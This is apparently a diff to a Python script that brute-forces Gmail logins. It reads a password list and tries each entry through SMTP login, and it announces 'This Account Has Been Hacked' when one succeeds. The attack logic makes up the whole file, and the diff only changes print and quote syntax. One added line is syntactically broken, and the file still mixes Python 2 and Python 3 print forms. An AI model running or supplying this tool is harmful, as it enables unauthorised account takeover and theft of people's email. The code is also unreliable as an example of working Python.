@@ -8,13 +8,13 @@ def main():
    os.system("clear")
    os.system("figlet Gmail")
 main()
-print '[1] start the attack'
-print '[2] exit'
-option = input('==>')
+print ("[1] start the attack")
+print ("[2] exit")
+option = input("==>")
 if option == 1:
-   file_path = raw_input('path of passwords file :')
+   file_path = raw_input("path of passwords file :")
 else:
-   system('clear')
+   system("clear")
    exit()
 pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
@@ -28,19 +28,18 @@ def login():
       print str(i) + '/' + str(len(pass_list))
       try:
          server.login(user_name, password)
-         system('clear')
+         system("clear")
          main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print ("[+] This Account Has Been Hacked Password :" + password)
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
-            system('clear')
+            system("clear")
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print ("[+] this account has been hacked, password" : + password ) 
 
             break
          else:
-            print '[!] password not found => ' + password
+            print ("[!] password not found => " + password)
 login()
